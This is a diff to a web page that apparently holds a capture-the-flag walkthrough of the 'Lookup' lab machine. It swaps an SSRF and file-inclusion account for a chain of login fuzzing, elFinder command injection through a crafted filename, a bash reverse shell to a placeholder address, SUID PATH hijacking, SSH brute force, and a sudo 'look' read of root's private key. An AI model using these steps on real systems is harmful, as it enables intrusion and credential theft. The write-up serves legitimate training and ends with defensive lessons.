@@ -68,15 +68,18 @@
 
       <!-- Tags -->
       <div class="writeup-tags">
-        <span class="writeup-tag">SSRF</span>
-        <span class="writeup-tag">LFI</span>
-        <span class="writeup-tag">Cron</span>
-        <span class="writeup-tag">Symlink</span>
-        <span class="writeup-tag">Nginx</span>
-        <span class="writeup-tag">Node.js</span>
+        <span class="writeup-tag">ffuf</span>
+        <span class="writeup-tag">Enumeration</span>
+        <span class="writeup-tag">Subdomain</span>
+        <span class="writeup-tag">elFinder</span>
+        <span class="writeup-tag">CVE-2019-9194</span>
+        <span class="writeup-tag">RCE</span>
+        <span class="writeup-tag">SUID</span>
+        <span class="writeup-tag">PATH Injection</span>
+        <span class="writeup-tag">sudo</span>
+        <span class="writeup-tag">GTFOBins</span>
         <span class="writeup-tag">Linux</span>
         <span class="writeup-tag">Web</span>
-        <span class="writeup-tag">Enumeration</span>
       </div>
 
       <hr class="writeup-divider">
@@ -84,42 +87,101 @@
       <!-- Writeup body (rendered from Markdown) -->
       <article class="writeup-body">
         <h2>Overview</h2>
-<p>Lookup is an easy-rated machine combining Linux and web attack vectors. It features a web application with a vulnerable lookup/search feature that can be abused for server-side request forgery and local file inclusion.</p>
+<p>Lookup is an easy boot-to-root that rewards careful web enumeration. The chain is: username enumeration on a login form → pivot to a hidden file-manager subdomain → elFinder 2.1.47 command injection to get a shell → abuse of a misconfigured SUID binary for horizontal escalation → root via a passwordless <code>sudo</code> rule for <code>look</code>.</p>
 <h2>Reconnaissance</h2>
 <h3>Nmap Scan</h3>
 <pre><code>$ nmap -sC -sV -oN nmap/lookup 10.10.11.xx
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.4p1
-80/tcp open  http    nginx 1.18.0
-3000/tcp open http   Node.js Express
+22/tcp open  ssh     OpenSSH
+80/tcp open  http    nginx
 </code></pre>
-<p>We find SSH, an nginx reverse proxy on port 80, and a Node.js Express application on port 3000.</p>
+<p>HTTP redirects to <code>http://lookup.thm/</code>, so I added the host entry and browsed the site.</p>
+<p>Example hosts entry:</p>
+<pre><code>10.10.11.xx lookup.thm
+</code></pre>
 <h3>Web Application</h3>
-<p>The application provides a &quot;lookup&quot; feature that fetches and displays content from user-supplied URLs. This is a classic SSRF vector.</p>
+<p>The main site presents a login form. Testing random usernames/passwords shows the application leaks information via its error responses (valid user vs invalid user vs invalid password), which makes it a good target for form fuzzing.</p>
 <h2>Exploitation</h2>
-<h3>SSRF to Internal Services</h3>
-<p>By pointing the lookup feature at internal addresses, we can reach services not exposed externally:</p>
-<pre><code>GET /lookup?url=http://127.0.0.1:3000/admin/config HTTP/1.1
-Host: 10.10.11.xx
+<h3>Username Enumeration (FFUF)</h3>
+<p>I fuzzed the login form and watched response characteristics (status code / size) to identify valid usernames.</p>
+<p>Example (username fuzz):</p>
+<pre><code>ffuf -u http://lookup.thm/login.php \
+  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d 'username=FUZZ&amp;password=invalid' \
+  -fc 200
 </code></pre>
-<p>The internal admin config endpoint reveals database credentials and API keys.</p>
-<h3>Local File Inclusion</h3>
-<p>The lookup handler also accepts <code>file://</code> URIs:</p>
-<pre><code>GET /lookup?url=file:///etc/passwd HTTP/1.1
+<p>One username stood out as behaving differently (different response length / different failure message). In this case, <code>admin</code> was a valid username.</p>
+<p>From there I tried password fuzzing for the known-valid user. A single password candidate produced a noticeably different response compared to the rest (a strong hint that it’s relevant), but <code>admin:&lt;candidate&gt;</code> still did not log in.</p>
+<p>Instead of stopping there, I re-ran username fuzzing while keeping that candidate password fixed. That revealed a second username that actually authenticated successfully:</p>
+<ul>
+<li><code>jose</code> / <code>password123</code></li>
+</ul>
+<h3>Login Pivot to the Files Subdomain</h3>
+<p>From here, the successful login path ultimately redirects to a second host:</p>
+<ul>
+<li><code>files.lookup.thm</code></li>
+</ul>
+<p>So I added it to my hosts file as well:</p>
+<pre><code>10.10.11.xx files.lookup.thm
 </code></pre>
-<h3>Privilege Escalation</h3>
-<p>With SSH access obtained through leaked credentials, we discover a cron job running as root that processes files from a user-writable directory:</p>
-<pre><code>$ cat /etc/cron.d/backup
-*/5 * * * * root /opt/backup.sh
+<p>Browsing <code>files.lookup.thm</code> exposes an elFinder instance.</p>
+<h3>elFinder RCE (CVE-2019-9194)</h3>
+<p>In the elFinder “About” page, the version is <code>2.1.47</code>, which is vulnerable to a command injection that can be triggered through image processing actions (e.g., rotate/resize).</p>
+<p>High-level approach:</p>
+<ol>
+<li>Upload a benign image.</li>
+<li>Rename it to a filename that injects a shell command to write a small PHP webshell file.</li>
+<li>Trigger an image action (rotate/resize) so the backend executes the injected filename.</li>
+<li>Hit the newly written PHP file with a query parameter to run commands, then pop a reverse shell.</li>
+</ol>
+<p>Once code execution is working, I switched to a reverse shell.</p>
+<p>Example reverse shell payload:</p>
+<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1'
 </code></pre>
-<p>By injecting a symlink into the backup source directory, we can read the root flag or escalate to a root shell.</p>
+<h3>Horizontal Privilege Escalation (SUID <code>pwm</code> + PATH Injection)</h3>
+<p>From the <code>www-data</code> shell, I found a SUID binary:</p>
+<ul>
+<li><code>/usr/sbin/pwm</code></li>
+</ul>
+<p>It invokes common utilities (like <code>id</code>) and attempts to read a <code>.passwords</code> file but looks in the wrong place. By placing a fake <code>id</code> earlier in <code>PATH</code>, I could influence what <code>pwm</code> sees and coax it into revealing the password list.</p>
+<p>In practice, the trick is that <code>pwm</code> appears to call <code>id</code> without an absolute path and then makes decisions based on its output. By writing our own <code>id</code> script into <code>/tmp</code> and prepending <code>/tmp</code> to <code>PATH</code>, <code>pwm</code> will execute our script, which prints an <code>id</code>-style line containing <code>(think)</code>.</p>
+<p>Highlights: SUID bit file pwn</p>
+<pre><code>echo '#!/bin/bash' &gt; /tmp/id
+echo 'echo &quot;uid=33(think) gid=33(think) groups=(think)&quot;' &gt;&gt; /tmp/id
+chmod +x /tmp/id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+</code></pre>
+<p>After that, I collected the leaked passwords into a wordlist and brute-forced SSH for the <code>think</code> user.</p>
+<p>Example:</p>
+<pre><code>hydra -l think -P passwords.txt ssh://lookup.thm
+</code></pre>
+<h3>Root (Sudo <code>look</code> via GTFOBins)</h3>
+<p>As <code>think</code>, <code>sudo -l</code> shows a passwordless rule allowing <code>look</code> as root.</p>
+<p>Because <code>look</code> can read arbitrary files (GTFOBins), I used it to dump root-only files.</p>
+<p>Highlights: Sudo <code>look</code> to extract SSH private key</p>
+<pre><code>LFILE=/root/.ssh/id_rsa
+sudo /usr/bin/look '' &quot;$LFILE&quot;
+</code></pre>
+<p>Copy the key locally, lock permissions, and SSH in:</p>
+<pre><code>chmod 600 id_rsa
+ssh -i id_rsa root@lookup.thm
+</code></pre>
 <h2>Flags</h2>
 <ul>
 <li><strong>User:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
 <li><strong>Root:</strong> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></li>
 </ul>
 <h2>Lessons Learned</h2>
-<p>Never trust user-supplied URLs in server-side fetch operations. Always validate and restrict URL schemes, and use allowlists for internal network access.</p>
+<ul>
+<li>Authentication endpoints should not leak user validity through error messages or response size.</li>
+<li>Keep file-manager components patched; don’t expose them on public subdomains.</li>
+<li>Avoid risky server-side shell-outs for file transformations.</li>
+<li>SUID binaries should not trust <code>PATH</code> and should use absolute paths for helpers.</li>
+<li>Minimize <code>sudo</code> rules and audit them against GTFOBins-style file reads.</li>
+</ul>
 
       </article>
     </div>
